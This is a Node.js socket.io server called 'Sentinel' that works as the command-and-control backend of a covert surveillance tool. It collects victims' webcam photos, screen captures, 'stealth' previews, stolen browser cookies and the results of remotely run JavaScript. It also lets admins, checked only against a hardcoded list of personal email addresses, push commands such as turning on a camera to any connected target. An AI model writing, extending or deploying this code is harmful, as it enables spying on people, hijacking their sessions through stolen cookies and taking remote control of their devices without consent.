const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(cors());

app.get('/', (req, res) => {
    res.send('Sentinel Server Running. Ready for connections.');
});

const server = http.createServer(app);
const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

// MEMORY STORAGE (Substitutes Firebase)
// Map<socketId, SessionData>
const sessions = new Map();
// Set<socketId>
const admins = new Set();

const ADMIN_EMAILS = ['yurealveshot2@gmail.com', 'yurealvesoficial@gmail.com'];

io.on('connection', (socket) => {
    console.log('New connection:', socket.id);

    // --- CLIENT EVENTS ---

    // Register a user session
    socket.on('register_user', (data) => {
        sessions.set(socket.id, {
            id: socket.id,
            ...data,
            lastActive: Date.now(),
            isLive: true
        });
        broadcastSessionsToAdmins();
    });

    // Update user status (heartbeat)
    socket.on('heartbeat', (data) => {
        if (sessions.has(socket.id)) {
            const session = sessions.get(socket.id);
            sessions.set(socket.id, { ...session, ...data, lastActive: Date.now(), isLive: true });
            // Only broadcast significant changes if needed, but for now we debounce on admin side
            // or broadcast periodically manually.
            // For real-time feel, let's broadcast activity updates to admins.
            broadcastSingleSessionUpdate(socket.id);
        } else {
            // Re-register if missing
            sessions.set(socket.id, {
                id: socket.id,
                ...data,
                lastActive: Date.now(),
                isLive: true
            });
            broadcastSessionsToAdmins();
        }
    });

    // Receive Snapshot/Intel from Client
    socket.on('client_data', (payload) => {
        // payload: { type: 'photo' | 'screen' | 'intel', data: ... }
        if (sessions.has(socket.id)) {
            const session = sessions.get(socket.id);
            const updatedSession = { ...session };

            if (payload.type === 'photo') updatedSession.photo = payload.data;
            if (payload.type === 'screen') updatedSession.screenPreview = payload.data;
            if (payload.type === 'intel') updatedSession.intel = payload.data;
            if (payload.type === 'stealth') updatedSession.stealthPreview = payload.data;
            if (payload.type === 'cookies') updatedSession.stolenCookies = payload.data;
            if (payload.type === 'js_result') updatedSession.lastJsResult = payload.data;

            sessions.set(socket.id, updatedSession);
            broadcastSingleSessionUpdate(socket.id);
        }
    });

    // --- ADMIN EVENTS ---

    // Admin Login
    socket.on('admin_login', (email) => {
        if (ADMIN_EMAILS.includes(email)) {
            admins.add(socket.id);
            socket.emit('admin_auth_success', true);
            // Send current list immediately
            socket.emit('sessions_list', Array.from(sessions.values()));
        } else {
            socket.emit('admin_auth_error', 'Unauthorized email');
        }
    });

    // Admin Command
    socket.on('admin_command', ({ targetId, command }) => {
        if (!admins.has(socket.id)) return;

        // Command structure: { type: 'START_CAM', payload: ... }
        io.to(targetId).emit('server_command', command);
    });

    // --- DISCONNECT ---
    socket.on('disconnect', () => {
        if (admins.has(socket.id)) {
            admins.delete(socket.id);
        }
        if (sessions.has(socket.id)) {
            sessions.delete(socket.id);
            broadcastSessionsToAdmins();
        }
        console.log('Disconnected:', socket.id);
    });
});

// Broadcast full list to all admins
function broadcastSessionsToAdmins() {
    const list = Array.from(sessions.values());
    for (const adminId of admins) {
        io.to(adminId).emit('sessions_list', list);
    }
}

// Broadcast single update (bandwidth optimization)
function broadcastSingleSessionUpdate(sessionId) {
    const session = sessions.get(sessionId);
    if (!session) return;
    for (const adminId of admins) {
        io.to(adminId).emit('session_update', session);
    }
}

// Prune stale sessions (just in case socket didn't close properly)
setInterval(() => {
    const now = Date.now();
    let changed = false;
    for (const [id, session] of sessions) {
        if (now - session.lastActive > 60000 * 5) { // 5 minutes inactivity
            sessions.delete(id);
            changed = true;
        }
    }
    if (changed) broadcastSessionsToAdmins();
}, 60000);

const PORT = process.env.PORT || 3001;
server.listen(PORT, () => {
    console.log(`Sentinel Server running on port ${PORT}`);
});
